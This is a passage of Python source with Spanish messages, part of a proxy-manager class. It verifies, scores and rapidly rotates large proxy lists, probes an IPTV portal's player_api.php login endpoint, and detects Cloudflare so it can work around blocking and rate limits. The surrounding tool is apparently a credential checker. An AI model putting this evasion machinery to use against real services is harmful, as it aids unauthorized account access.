       proxy_data = [(proxy, i) for i, proxy in enumerate(proxy_list)]

       with ThreadPoolExecutor(max_workers=max_workers) as executor:
           results = list(executor.map(verify_worker_optimized, proxy_data))

       bar.finish()

       for proxy, proxy_formatted, success, response_time in results:
           if success and proxy_formatted:
               valid_proxies.append((proxy, proxy_formatted))
               proxy_str = self._proxy_to_str(proxy_formatted)

               self._update_proxy_performance(proxy_str, True, response_time)
               self.good_proxies.add(proxy_str)
           elif proxy_formatted:
               proxy_str = self._proxy_to_str(proxy_formatted)
               self._update_proxy_performance(proxy_str, False, response_time)
               self.bad_proxies.add(proxy_str)

       self.proxies = [p[0] for p in valid_proxies]
       self.active_proxies = [p[1] for p in valid_proxies]

       self.active_proxies.sort(key=lambda p: self.proxy_scores.get(self._proxy_to_str(p), 50), reverse=True)

       valid_count = len(valid_proxies)

       self.proxy_stats['total'] = total
       self.proxy_stats['good'] = valid_count
       self.proxy_stats['bad'] = total - valid_count

       print(f"\n{Colors.GREEN}Verificación completada: {valid_count}/{total} proxies válidos ({(valid_count/total)*100:.2f}%){Colors.RESET}")

       if valid_count > 0:

           timestamp = datetime.now().strftime("%Y%m%d_%H%M")
           valid_file = f"Proxies/valid_{self.proxy_type}_{timestamp}_scored.txt"

           with open(valid_file, 'w', encoding='utf-8') as f:
               f.write("# Proxies verificados con scores (formato: proxy | score)\n")
               for proxy, proxy_formatted in valid_proxies:
                   proxy_str = self._proxy_to_str(proxy_formatted)
                   score = self.proxy_scores.get(proxy_str, 50)
                   f.write(f"{proxy} | Score: {score:.1f}\n")

           print(f"{Colors.GREEN}Proxies válidos guardados en: {valid_file}{Colors.RESET}")

           self._save_proxy_cache()

           self.enabled = True
           return True
       else:
           print(f"{Colors.RED}No se encontraron proxies válidos.{Colors.RESET}")
           self.enabled = False
           return False

    def _test_proxy_fast(self, proxy_dict):

        if not proxy_dict:
            return False

        test_endpoints = [
            'http://httpbin.org/ip',   
            'http://icanhazip.com',    
        ]

        try:

            timeout = (2, 3)  

            for endpoint in test_endpoints:
                try:
                    response = requests.get(
                        endpoint,
                        proxies=proxy_dict,
                        timeout=timeout,
                        verify=False,
                        headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
                    )

                    if response.status_code == 200 and len(response.text.strip()) > 0:
                        return True

                except requests.exceptions.ConnectTimeout:
                    continue
                except requests.exceptions.Timeout:
                    continue
                except requests.exceptions.ProxyError:

                    logger.debug("Error de autenticación en proxy")
                    return False
                except:
                    continue

            return False
        except:
            return False

    def load_proxies_with_auth_detection(self, filename, proxy_type="socks5"):
        """Carga proxies con detección automática de autenticación"""
        if not os.path.exists(filename):
            logger.error(f"Archivo no encontrado: {filename}")
            return False

        print(f"{Colors.CYAN}Cargando proxies con detección de autenticación...{Colors.RESET}")

        try:
            with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
                raw_proxies = [line.strip() for line in f if line.strip() and not line.startswith('#')]

            total_count = len(raw_proxies)
            auth_count = 0
            basic_count = 0

            for proxy in raw_proxies:
                parts = proxy.split(':')
                if len(parts) >= 4:
                    auth_count += 1
                elif len(parts) == 2:
                    basic_count += 1

            print(f"{Colors.GREEN}Proxies cargados: {total_count}{Colors.RESET}")
            print(f"  {Colors.CYAN}Con autenticación: {auth_count}{Colors.RESET}")
            print(f"  {Colors.YELLOW}Sin autenticación: {basic_count}{Colors.RESET}")

            if auth_count > 0:
                print(f"{Colors.GREEN}[OK] Soporte de autenticacion activado{Colors.RESET}")

            verify_choice = input(f"{Colors.YELLOW}¿Verificar proxies? (s/n): {Colors.RESET}").lower()

            if verify_choice == 's':
                return self._verify_proxies_with_auth(raw_proxies, proxy_type)
            else:

                self.proxies = raw_proxies
                self.active_proxies = []

                for proxy in raw_proxies:
                    formatted = self._format_proxy(proxy, proxy_type)
                    if formatted:
                        self.active_proxies.append(formatted)

                valid_count = len(self.active_proxies)
                print(f"{Colors.GREEN}Proxies formateados: {valid_count}/{total_count}{Colors.RESET}")

                if valid_count > 0:
                    self.enabled = True
                    return True
                else:
                    self.enabled = False
                    return False

        except Exception as e:
            logger.error(f"Error cargando proxies: {e}")
            return False

    def _verify_proxies_with_auth(self, proxy_list, proxy_type):
        """Verifica proxies con soporte de autenticación"""
        print(f"\n{Colors.CYAN}Verificando proxies con autenticación...{Colors.RESET}")

        max_workers = min(100, len(proxy_list) // 5)
        print(f"{Colors.YELLOW}Usando {max_workers} workers para verificación con autenticación{Colors.RESET}")

        valid_proxies = []
        auth_failures = []

        widgets = [
            f'{Colors.GREEN}Verificando auth: {Colors.RESET}',
            progressbar.Percentage(),
            ' ',
            progressbar.Bar(marker=f'{Colors.GREEN}█{Colors.RESET}'),
            ' ',
            progressbar.ETA()
        ]

        bar = progressbar.ProgressBar(widgets=widgets, max_value=len(proxy_list)).start()

        def verify_auth_worker(proxy_data):
            """Worker para verificar proxy con autenticación"""
            proxy, index = proxy_data
            try:
                start_time = time.time()

                proxy_formatted = self._format_proxy(proxy, proxy_type)

                if proxy_formatted:

                    success = self._test_proxy_with_auth(proxy_formatted)
                    response_time = time.time() - start_time

                    bar.update(index + 1)
                    return (proxy, proxy_formatted, success, response_time)
                else:
                    bar.update(index + 1)
                    return (proxy, None, False, 0)

            except Exception as e:
                logger.debug(f"Error verificando proxy autenticado {proxy}: {e}")
                bar.update(index + 1)
                return (proxy, None, False, 0)

        proxy_data = [(proxy, i) for i, proxy in enumerate(proxy_list)]

        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            results = list(executor.map(verify_auth_worker, proxy_data))

        bar.finish()

        for proxy, proxy_formatted, success, response_time in results:
            if success and proxy_formatted:
                valid_proxies.append((proxy, proxy_formatted))
            elif ':' in proxy and len(proxy.split(':')) >= 4:
                auth_failures.append(proxy)

        self.proxies = [p[0] for p in valid_proxies]
        self.active_proxies = [p[1] for p in valid_proxies]

        valid_count = len(valid_proxies)
        auth_fail_count = len(auth_failures)

        print(f"\n{Colors.GREEN}Verificación completada:{Colors.RESET}")
        print(f"  {Colors.GREEN}Proxies válidos: {valid_count}{Colors.RESET}")
        if auth_fail_count > 0:
            print(f"  {Colors.RED}Fallos de autenticación: {auth_fail_count}{Colors.RESET}")

        if valid_count > 0:
            self.enabled = True
            return True
        else:
            self.enabled = False
            return False

    def _test_proxy_with_auth(self, proxy_dict):
        """Prueba proxy con soporte completo de autenticación"""
        if not proxy_dict:
            return False

        test_endpoints = [
            'http://httpbin.org/ip',
            'http://icanhazip.com',
            'https://api.ipify.org'
        ]

        for endpoint in test_endpoints:
            try:

                timeout = (4, 6)  

                response = requests.get(
                    endpoint,
                    proxies=proxy_dict,
                    timeout=timeout,
                    verify=False,
                    headers={
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                    }
                )

                if response.status_code == 200:

                    response_text = response.text.strip()

                    if endpoint == 'http://httpbin.org/ip':
                        try:
                            data = response.json()
                            if 'origin' in data:
                                logger.debug(f"Proxy autenticado funcional, IP: {data['origin']}")
                                return True
                        except:
                            pass

                    elif '.' in response_text and len(response_text) < 50:
                        logger.debug(f"Proxy autenticado funcional, IP: {response_text}")
                        return True

            except requests.exceptions.ProxyError as e:
                logger.debug(f"Error de autenticación del proxy: {e}")
                return False
            except requests.exceptions.Timeout:
                logger.debug("Timeout en proxy con autenticación")
                continue
            except Exception as e:
                logger.debug(f"Error verificando proxy autenticado: {e}")
                continue

        return False

    def _detect_cloudflare_protection(self, response, portal_url):
        """Detecta si el portal tiene protección Cloudflare activa"""
        if not response:
            return False

        cf_headers = [
            'cf-ray', 'cf-cache-status', 'cf-request-id', 
            'server', '__cfduid', 'cf-connecting-ip'
        ]

        has_cf_headers = any(header in response.headers for header in cf_headers)

        server_header = response.headers.get('server', '').lower()
        is_cf_server = 'cloudflare' in server_header

        if hasattr(response, 'text'):
            cf_content_patterns = [
                'checking your browser',
                'ddos protection by cloudflare',
                'ray id:',
                'cloudflare',
                'cf-browser-verification',
                'challenge-platform'
            ]

            response_text = response.text.lower()
            has_cf_content = any(pattern in response_text for pattern in cf_content_patterns)
        else:
            has_cf_content = False

        is_protection_code = response.status_code in [403, 503, 429, 521, 522, 523, 524]

        is_cloudflare = has_cf_headers or is_cf_server or has_cf_content or is_protection_code

        if is_cloudflare:
            logger.warning(f"Cloudflare detectado en {portal_url}")
            logger.debug(f"Headers CF: {has_cf_headers}, Server CF: {is_cf_server}, Content CF: {has_cf_content}, Code: {response.status_code}")

        return is_cloudflare

    def _test_proxy_against_portal_with_cf_detection(self, proxy_dict, portal_url):
        """Prueba proxy contra portal con detección de Cloudflare"""
        if not proxy_dict:
            return False, None

        try:
            if not portal_url.startswith(('http://', 'https://')):
                portal_url = f"http://{portal_url}"

            test_url = f"{portal_url}/player_api.php?username=test&password=test"

            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1'
            }

            response = requests.get(
                test_url,
                proxies=proxy_dict,
                timeout=(5, 8),  
                verify=False,
                headers=headers,
                allow_redirects=True  
            )

            has_cloudflare = self._detect_cloudflare_protection(response, portal_url)

            if has_cloudflare:
                logger.debug(f"Proxy bloqueado por Cloudflare")
                return False, "cloudflare"

            if response.status_code in [200, 401]:
                response_text = response.text.lower()

                iptv_patterns = [
                    'user_info', 'incorrect_user', 'auth', 
                    'exp_date', 'player_api', 'user_info'
                ]

                if any(pattern in response_text for pattern in iptv_patterns):
                    return True, "valid"
                elif response.status_code in [200, 401]:
                    return True, "probably_valid"

            return False, f"http_{response.status_code}"

        except requests.exceptions.Timeout:
            return False, "timeout"
        except requests.exceptions.ConnectionError:
            return False, "connection_error"
        except Exception as e:
            return False, f"error_{type(e).__name__}"

    def verify_proxies_against_portal(self, proxy_list, proxy_type, portal_url):
        """Verifica proxies contra el portal IPTV específico que se va a usar"""
        print(f"\n{Colors.CYAN}Verificando proxies contra el portal: {portal_url}{Colors.RESET}")

        import multiprocessing
        cpu_count = multiprocessing.cpu_count()
        max_workers = min(100, cpu_count * 20)  

        print(f"{Colors.YELLOW}Usando {max_workers} workers para verificación contra portal{Colors.RESET}")

        valid_proxies = []
        total = len(proxy_list)

        widgets = [
            f'{Colors.GREEN}Verificando contra portal: {Colors.RESET}',
            progressbar.Percentage(),
            ' ',
            progressbar.Bar(marker=f'{Colors.GREEN}█{Colors.RESET}'),
            ' ',
            progressbar.ETA(),
            ' ',
            progressbar.Counter()
        ]

        bar = progressbar.ProgressBar(widgets=widgets, max_value=total).start()

        def verify_proxy_against_portal(proxy_data):
            """Worker para verificar un proxy contra el portal específico"""
            proxy, index = proxy_data
            try:
                start_time = time.time()

                proxy_formatted = self._format_proxy(proxy, proxy_type)

                if proxy_formatted:

                    success = self._test_proxy_against_portal(proxy_formatted, portal_url)
                    response_time = time.time() - start_time

                    bar.update(index + 1)
                    return (proxy, proxy_formatted, success, response_time)
                else:
                    bar.update(index + 1)
                    return (proxy, None, False, 0)

            except Exception as e:
                logger.debug(f"Error verificando proxy {proxy}: {e}")
                bar.update(index + 1)
                return (proxy, None, False, 0)

        proxy_data = [(proxy, i) for i, proxy in enumerate(proxy_list)]

        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            results = list(executor.map(verify_proxy_against_portal, proxy_data))

        bar.finish()

        for proxy, proxy_formatted, success, response_time in results:
            if success and proxy_formatted:
                valid_proxies.append((proxy, proxy_formatted, response_time))
                proxy_str = self._proxy_to_str(proxy_formatted)

                self._update_proxy_performance(proxy_str, True, response_time)
                self.good_proxies.add(proxy_str)
            elif proxy_formatted:
                proxy_str = self._proxy_to_str(proxy_formatted)
                self._update_proxy_performance(proxy_str, False, response_time if response_time > 0 else 10)
                self.bad_proxies.add(proxy_str)

        valid_proxies.sort(key=lambda x: x[2])

        self.proxies = [p[0] for p in valid_proxies]
        self.active_proxies = [p[1] for p in valid_proxies]

        valid_count = len(valid_proxies)

        print(f"\n{Colors.GREEN}Verificación contra portal completada: {valid_count}/{total} proxies válidos ({(valid_count/total)*100:.2f}%){Colors.RESET}")

        if valid_count > 0:

            fastest = valid_proxies[0][2]
            slowest = valid_proxies[-1][2]
            avg_time = sum(p[2] for p in valid_proxies) / len(valid_proxies)

            print(f"{Colors.CYAN}Estadísticas de respuesta:{Colors.RESET}")
            print(f"  {Colors.GREEN}Más rápido: {fastest:.2f}s{Colors.RESET}")
            print(f"  {Colors.YELLOW}Promedio: {avg_time:.2f}s{Colors.RESET}")
            print(f"  {Colors.RED}Más lento: {slowest:.2f}s{Colors.RESET}")

            timestamp = datetime.now().strftime("%Y%m%d_%H%M")
            valid_file = f"Proxies/valid_{self.proxy_type}_{timestamp}_portal_tested.txt"

            with open(valid_file, 'w', encoding='utf-8') as f:
                f.write(f"# Proxies verificados contra portal: {portal_url}\n")
                f.write(f"# Ordenados por velocidad de respuesta\n")
                f.write(f"# Un proxy por línea - Formato: IP:PUERTO o IP:PUERTO:USER:PASS\n")
                f.write(f"# ═══════════════════════════════════════════════════════════\n")

                for proxy, proxy_formatted, response_time in valid_proxies:
                    f.write(f"{proxy}\n")  

            print(f"{Colors.GREEN}Proxies válidos guardados en: {valid_file}{Colors.RESET}")

            self._save_proxy_cache()

            self.enabled = True
            return True
        else:
            print(f"{Colors.RED}No se encontraron proxies válidos para este portal.{Colors.RESET}")
            self.enabled = False
            return False

    def _test_proxy_against_portal(self, proxy_dict, portal_url):
        """Prueba un proxy específicamente contra el portal IPTV"""
        if not proxy_dict:
            return False

        try:

            if not portal_url.startswith(('http://', 'https://')):
                portal_url = f"http://{portal_url}"

            test_url = f"{portal_url}/player_api.php?username=test&password=test"

            timeout = (3, 5)  

            response = requests.get(
                test_url,
                proxies=proxy_dict,
                timeout=timeout,
                verify=False,
                headers={
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                    'Accept': 'application/json, text/plain, */*'
                }
            )

            if response.status_code in [200, 401]:  

                response_text = response.text.lower()

                iptv_patterns = [
                    'user_info',
                    'incorrect_user',
                    'auth',
                    'exp_date',
                    'player_api'
                ]

                if any(pattern in response_text for pattern in iptv_patterns):
                    logger.debug(f"Proxy válido para portal IPTV: {response.status_code}")
                    return True

                if response.status_code in [200, 401]:
                    logger.debug(f"Proxy responde al portal: {response.status_code}")
                    return True

            elif response.status_code in [403, 404]:

                logger.debug(f"Proxy conecta pero respuesta: {response.status_code}")
                return False  

            logger.debug(f"Proxy no válido para portal: {response.status_code}")
            return False

        except requests.exceptions.Timeout:
            logger.debug("Proxy timeout contra portal")
            return False
        except requests.exceptions.ConnectionError:
            logger.debug("Proxy no puede conectar al portal")
            return False
        except Exception as e:
            logger.debug(f"Error probando proxy contra portal: {e}")
            return False

    def verify_proxies_against_portal_cf_aware(self, proxy_list, proxy_type, portal_url):
        """Verificación de proxies con detección de Cloudflare"""
        print(f"\n{Colors.CYAN}Verificando proxies contra portal: {portal_url}{Colors.RESET}")
        print(f"{Colors.YELLOW}Detectando protección Cloudflare...{Colors.RESET}")

        try:
            test_response = requests.get(
                f"http://{portal_url}/player_api.php?username=test&password=test",
                timeout=10,
                verify=False
            )

            if self._detect_cloudflare_protection(test_response, portal_url):
                print(f"{Colors.RED}⚠️  CLOUDFLARE DETECTADO EN EL PORTAL ⚠️{Colors.RESET}")
                print(f"{Colors.YELLOW}Esto puede afectar la verificación de proxies.{Colors.RESET}")

                choice = input(f"{Colors.YELLOW}¿Continuar con verificación limitada? (s/n): {Colors.RESET}").lower()
                if choice != 's':
                    return False

                print(f"{Colors.CYAN}Usando verificación adaptada para Cloudflare...{Colors.RESET}")
            else:
                print(f"{Colors.GREEN}No se detectó Cloudflare. Verificación normal.{Colors.RESET}")

        except Exception as e:
            print(f"{Colors.YELLOW}No se pudo verificar Cloudflare: {e}{Colors.RESET}")

        max_workers = min(20, len(proxy_list) // 10)  
        print(f"{Colors.YELLOW}Usando {max_workers} workers (reducido para evitar rate limiting){Colors.RESET}")

        valid_proxies = []
        cloudflare_blocked = []
        total = len(proxy_list)

        widgets = [
            f'{Colors.GREEN}Verificando (CF-aware): {Colors.RESET}',
            progressbar.Percentage(),
            ' ',
            progressbar.Bar(marker=f'{Colors.GREEN}█{Colors.RESET}'),
            ' ',
            progressbar.ETA()
        ]

        bar = progressbar.ProgressBar(widgets=widgets, max_value=total).start()

        def verify_worker_cf_aware(proxy_data):
            """Worker adaptado para Cloudflare"""
            proxy, index = proxy_data
            try:

                time.sleep(random.uniform(0.5, 2.0))

                start_time = time.time()
                proxy_formatted = self._format_proxy(proxy, proxy_type)

                if proxy_formatted:
                    success, reason = self._test_proxy_against_portal_with_cf_detection(
                        proxy_formatted, portal_url
                    )
                    response_time = time.time() - start_time

                    bar.update(index + 1)
                    return (proxy, proxy_formatted, success, response_time, reason)
                else:
                    bar.update(index + 1)
                    return (proxy, None, False, 0, "format_error")

            except Exception as e:
                bar.update(index + 1)
                return (proxy, None, False, 0, f"exception_{type(e).__name__}")

        proxy_data = [(proxy, i) for i, proxy in enumerate(proxy_list)]

        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            results = list(executor.map(verify_worker_cf_aware, proxy_data))

        bar.finish()

        stats = {"valid": 0, "cloudflare": 0, "timeout": 0, "other": 0}

        for proxy, proxy_formatted, success, response_time, reason in results:
            if success and proxy_formatted:
                valid_proxies.append((proxy, proxy_formatted, response_time))
                stats["valid"] += 1
            elif reason == "cloudflare":
                cloudflare_blocked.append(proxy)
                stats["cloudflare"] += 1
            elif reason == "timeout":
                stats["timeout"] += 1
            else:
                stats["other"] += 1

        print(f"\n{Colors.CYAN}Resultados de verificación:{Colors.RESET}")
        print(f"  {Colors.GREEN}Válidos: {stats['valid']}{Colors.RESET}")
        print(f"  {Colors.RED}Bloqueados por Cloudflare: {stats['cloudflare']}{Colors.RESET}")
        print(f"  {Colors.YELLOW}Timeouts: {stats['timeout']}{Colors.RESET}")
        print(f"  {Colors.GREY}Otros errores: {stats['other']}{Colors.RESET}")

        if stats['cloudflare'] > stats['valid']:
            print(f"\n{Colors.RED}⚠️  ADVERTENCIA: Muchos proxies bloqueados por Cloudflare{Colors.RESET}")
            print(f"{Colors.YELLOW}Considera usar proxies residenciales o esperar antes de verificar más.{Colors.RESET}")

        if valid_proxies:
            valid_proxies.sort(key=lambda x: x[2])  

            self.proxies = [p[0] for p in valid_proxies]
            self.active_proxies = [p[1] for p in valid_proxies]

            return True
        else:
            return False

    def _format_proxy(self, proxy, proxy_type):
        """Formatea un proxy según su tipo - CORREGIDO para user:pass@host:port"""
        proxy = proxy.strip()

        try:

            if '@' in proxy:

                auth_part, addr_part = proxy.split('@', 1)

                if ':' in auth_part:
                    user, password = auth_part.split(':', 1)
                else:
                    user, password = auth_part, ""

                if ':' in addr_part:
                    host, port = addr_part.rsplit(':', 1)
                else:
                    return None

                try:
                    port_num = int(port)
                    if not (1 <= port_num <= 65535):
                        return None
                except ValueError:
                    return None

                if proxy_type.lower() in ['socks5', '5']:
                    proxy_url = f'socks5://{user}:{password}@{host}:{port}'
                elif proxy_type.lower() in ['socks4', '4']:
                    proxy_url = f'socks4://{user}:{password}@{host}:{port}'
                elif proxy_type.lower() in ['http', 'https', 'h']:
                    proxy_url = f'http://{user}:{password}@{host}:{port}'
                else:
                    return None

                return {
                    'http': proxy_url,
                    'https': proxy_url
                }

            elif ':' in proxy and len(proxy.split(':')) == 4:

                parts = proxy.split(':')
                host, port, user, password = parts[0], parts[1], parts[2], parts[3]

                try:
                    port_num = int(port)
                    if not (1 <= port_num <= 65535):
                        return None
                except ValueError:
                    return None

                if proxy_type. lower() in ['socks5', '5']: 
                    proxy_url = f'socks5://{user}:{password}@{host}:{port}'
                elif proxy_type.lower() in ['socks4', '4']:
                    proxy_url = f'socks4://{user}:{password}@{host}:{port}'
                elif proxy_type.lower() in ['http', 'https', 'h']:
                    proxy_url = f'http://{user}:{password}@{host}:{port}'
                else:
                    return None

                return {
                    'http': proxy_url,
                    'https': proxy_url
                }

            elif len(proxy.split(':')) == 2:
                host, port = proxy.split(':')

                try:
                    port_num = int(port)
                    if not (1 <= port_num <= 65535):
                        return None
                except ValueError:
                    return None

                if proxy_type.lower() in ['socks5', '5']:
                    return {
                        'http': f'socks5://{host}:{port}',
                        'https': f'socks5://{host}:{port}'
                    }
                elif proxy_type.lower() in ['socks4', '4']:
                    return {
                        'http': f'socks4://{host}:{port}',
                        'https': f'socks4://{host}:{port}'
                    }
                elif proxy_type.lower() in ['http', 'https', 'h']:
                    return {
                        'http': f'http://{host}:{port}',
                        'https': f'http://{host}:{port}'
                    }

            return None

        except Exception as e:
            logger.debug(f"Error formateando proxy {proxy}: {e}")
            return None

    def get_proxy(self):
        """Obtiene un proxy con rotación simple y sin deadlocks - VERSIÓN SIMPLIFICADA"""
        if not self.enabled or not self.active_proxies:
            return None

        current_time = time.time()
        if (self.auto_rotation_enabled and self.time_based_rotation and
            current_time - self.last_rotation_time >= self.rotation_interval):
            logger.warning(f"[TIMER] INICIANDO ROTACION: {current_time - self.last_rotation_time:.1f}s desde ultima rotacion")
            self._force_time_rotation()

        if self.should_force_rotate():
            logger.warning("[FORCE] Rotación forzada cada 2 segundos")
            with self.lock:
                if len(self.active_proxies) > 1:
                    self.proxy_index = (self.proxy_index + 1) % len(self.active_proxies)

        try:

            if not self.lock.acquire(timeout=0.5):

                if self.active_proxies:
                    proxy_index = random.randint(0, len(self.active_proxies) - 1)
                    return self.active_proxies[proxy_index]
                return None

            try:

                if not self.active_proxies:
                    return None

                total_proxies = len(self.active_proxies)
                if self.proxy_index >= total_proxies:
                    self.proxy_index = 0

                attempts = 0
                max_attempts = total_proxies
                while attempts < max_attempts:
                    selected_proxy = self.active_proxies[self.proxy_index]
                    self.proxy_index = (self.proxy_index + 1) % total_proxies

                    if not self.is_proxy_blacklisted(selected_proxy):

                        logger.debug(f"GET_PROXY devuelve: {selected_proxy} (índice: {self.proxy_index-1}/{total_proxies})")
                        return selected_proxy

                    attempts += 1
                    logger.debug(f"Proxy blacklisteado {self._proxy_to_str(selected_proxy)}, buscando siguiente...")

                if self.blacklisted_proxies:
                    logger.warning("TODOS LOS PROXIES BLACKLISTEADOS - Limpiando blacklist")
                    self.blacklisted_proxies.clear()
                    selected_proxy = self.active_proxies[self.proxy_index]
                    self.proxy_index = (self.proxy_index + 1) % total_proxies
                    return selected_proxy

                return None

            finally:
                self.lock.release()

        except Exception as e:
            logger.debug(f"Error en get_proxy simplificado: {e}")

            if self.active_proxies:
                return random.choice(self.active_proxies)
            return None

    def get_best_proxy(self):
        """Selección simplificada de proxy - sin scoring complejo"""
        if not self.active_proxies:
            return None

        current_time = time.time()
        if (self.auto_rotation_enabled and self.time_based_rotation and
            current_time - self.last_rotation_time >= self.rotation_interval):
            logger.warning(f"[TIMER] ROTACION EN GET_BEST_PROXY: {current_time - self.last_rotation_time:.1f}s transcurridos")
            self._force_time_rotation()

        try:

            if not self.lock.acquire(timeout=0.1):
                return None

            try:

                available_proxies = []
                current_time = time.time()

                for proxy in self.active_proxies:
                    proxy_str = self._proxy_to_str(proxy)

                    if proxy_str in self.quarantine_proxies:
                        if current_time < self.quarantine_proxies[proxy_str]:
                            continue
                        else:

                            del self.quarantine_proxies[proxy_str]

                    available_proxies.append(proxy)

                if available_proxies:
                    return random.choice(available_proxies)
                else:
                    return random.choice(self.active_proxies) if self.active_proxies else None

            finally:
                self.lock.release()

        except Exception as e:
            logger.debug(f"Error en get_best_proxy simplificado: {e}")
            return None

    def debug_proxy_loading(self):
        """Debug para verificar carga de proxies"""
        print(f"\n{Colors.CYAN}=== DEBUG PROXY LOADING ==={Colors.RESET}")
        print(f"Enabled: {self.enabled}")
        print(f"Total proxies: {len(self.proxies) if hasattr(self, 'proxies') else 'No attribute'}")
        print(f"Active proxies: {len(self.active_proxies) if hasattr(self, 'active_proxies') else 'No attribute'}")

        if hasattr(self, 'active_proxies') and self.active_proxies:
            print(f"Primer proxy: {self.active_proxies[0]}")
            print(f"Primer proxy str: {self._proxy_to_str(self.active_proxies[0])}")

        test_proxy = self.get_proxy()
        print(f"Test get_proxy(): {test_proxy}")
        if test_proxy:
            print(f"Test proxy str: {self._proxy_to_str(test_proxy)}")

        print(f"=== FIN DEBUG ==={Colors.RESET}\n")

    def get_proxy_backup(self):
        """Obtiene proxy evitando los congelados - VERSIÓN ANTI-FREEZE"""
        if not self.enabled or not self.active_proxies:
            return None

        current_time = time.time()
        max_attempts = 5  

        for attempt in range(max_attempts):
            try:

                with self.lock:

                    available_proxies = []

                    for proxy in self.active_proxies:
                        proxy_str = self._proxy_to_str(proxy)

                        if proxy_timeout_manager.is_proxy_frozen(proxy):
                            continue

                        if proxy_str in self.quarantine_proxies:
                            if current_time < self.quarantine_proxies[proxy_str]:
                                continue
                            else:

                                del self.quarantine_proxies[proxy_str]
                                self.proxy_failures[proxy_str] = 0

                        score = self.proxy_scores.get(proxy_str, 50)
                        if score >= 25:  
                            available_proxies.append((proxy, score))

                    if not available_proxies:
                        logger.warning("No hay proxies disponibles no congelados")
                        return None

                    if len(available_proxies) == 1:
                        selected_proxy, _ = available_proxies[0]
                    else:

                        weights = [score for _, score in available_proxies]
                        selected_proxy, _ = random.choices(available_proxies, weights=weights)[0]

                    proxy_str = self._proxy_to_str(selected_proxy)
                    self.proxy_last_used[proxy_str] = current_time

                    logger.debug(f"Proxy seleccionado (no congelado): {proxy_str}")
                    return selected_proxy

            except Exception as e:
                logger.debug(f"Error en intento {attempt + 1}: {e}")
                time.sleep(0.1)

        logger.error("No se pudo obtener proxy después de múltiples intentos")
        return None

    def _proxy_to_str(self, proxy):
        """Extrae la dirección para mostrar en pantalla - CORREGIDO"""
        if not proxy:
            return ""

        http_proxy = proxy.get('http', '') or proxy.get('https', '')
        if http_proxy:
            try:

                if '://' in http_proxy:
                    url_part = http_proxy.split('://', 1)[1]
                    if '@' in url_part:

                        return url_part.split('@', 1)[1]
                    else:

                        return url_part
                return http_proxy
            except:
                return ""
        return ""

    def report_proxy_success(self, proxy):
        """Reporta que un proxy funcionó correctamente"""
        if not proxy or not self.enabled:
            return

        proxy_str = self._proxy_to_str(proxy)
        if proxy_str:
            self._update_proxy_performance(proxy_str, True)

            with self.lock:
                if proxy_str not in self.good_proxies:
                    self.good_proxies.add(proxy_str)
                    self.proxy_stats['good'] += 1

                if proxy_str in self.bad_proxies:
                    self.bad_proxies.remove(proxy_str)
                    self.proxy_stats['bad'] = max(0, self.proxy_stats['bad'] - 1)

    def report_proxy_timeout(self, proxy, timeout_duration):
        """Registra que un proxy está siendo lento"""
        if not proxy:
            return

        proxy_str = self._proxy_to_str(proxy)
        if proxy_str:
            self._update_proxy_performance(proxy_str, False, timeout_duration)

    def remove_proxy(self, proxy):
        """Marca un proxy como problemático pero no lo elimina permanentemente"""
        if not proxy or not self.enabled:
            return

        proxy_str = self._proxy_to_str(proxy)
        if proxy_str:
            with self.lock:

                self._update_proxy_performance(proxy_str, False)
                self.bad_proxies.add(proxy_str)

                logger.debug(f"Proxy {proxy_str} marcado como problemático")

                self._force_next_proxy()

    def _force_next_proxy(self):
        """Fuerza la rotación al siguiente proxy inmediatamente - ASUME LOCK YA ADQUIRIDO"""

        if len(self.active_proxies) > 1:

            self.proxy_index = (self.proxy_index + 1) % len(self.active_proxies)
            logger.debug(f"Rotación forzada - nuevo índice: {self.proxy_index}")
        else:
            logger.debug("No se puede rotar - solo hay un proxy disponible")

    def _force_time_rotation(self):
        """Fuerza rotación automática por tiempo - optimizada para evitar bloqueos"""
        try:

            if self.lock.acquire(timeout=0.1):
                try:
                    if len(self.active_proxies) > 1:

                        old_index = self.proxy_index
                        self.proxy_index = (self.proxy_index + 1) % len(self.active_proxies)
                        self.last_rotation_time = time.time()
                        logger.warning(f"[ROTATE] ROTACION AUTOMATICA: Proxy {old_index} -> {self.proxy_index} (cada {self.rotation_interval}s)")
                    else:

                        self.last_rotation_time = time.time()
                finally:
                    self.lock.release()
            else:

                self.last_rotation_time = time.time()
        except Exception as e:
            logger.debug(f"Error en rotación por tiempo: {e}")

            self.last_rotation_time = time.time()

    def set_rotation_interval(self, seconds):
        """Configura el intervalo de rotación automática en segundos"""
        if seconds > 0:
            self.rotation_interval = seconds
            logger.info(f"Intervalo de rotación automática configurado a {seconds} segundos")
        else:
            logger.warning("El intervalo debe ser mayor a 0 segundos")

    def enable_auto_rotation(self, enabled=True):
        """Habilita o deshabilita la rotación automática por tiempo"""
        self.auto_rotation_enabled = enabled
        status = "habilitada" if enabled else "deshabilitada"
        logger.info(f"Rotación automática por tiempo {status}")

    def get_rotation_status(self):
        """Obtiene el estado actual de la rotación automática"""
        return {
            'auto_rotation_enabled': self.auto_rotation_enabled,
            'time_based_rotation': self.time_based_rotation,
            'rotation_interval': self.rotation_interval,
            'seconds_since_last_rotation': time.time() - self.last_rotation_time,
            'current_proxy_index': self.proxy_index,
            'total_active_proxies': len(self.active_proxies) if self.active_proxies else 0
        }

    def force_proxy_rotation(self):
        """Fuerza una rotación completa de proxies para recuperación"""
        try:
            with self.lock:
                if len(self.active_proxies) > 1:

                    self.proxy_index = (self.proxy_index + 3) % len(self.active_proxies)
                    logger.warning(f"ROTACIÓN FORZADA DE EMERGENCIA - nuevo índice: {self.proxy_index}")

                    self.proxy_last_used.clear()

                    current_time = time.time()
                    to_remove = []
                    for proxy_str, until_time in self.quarantine_proxies.items():
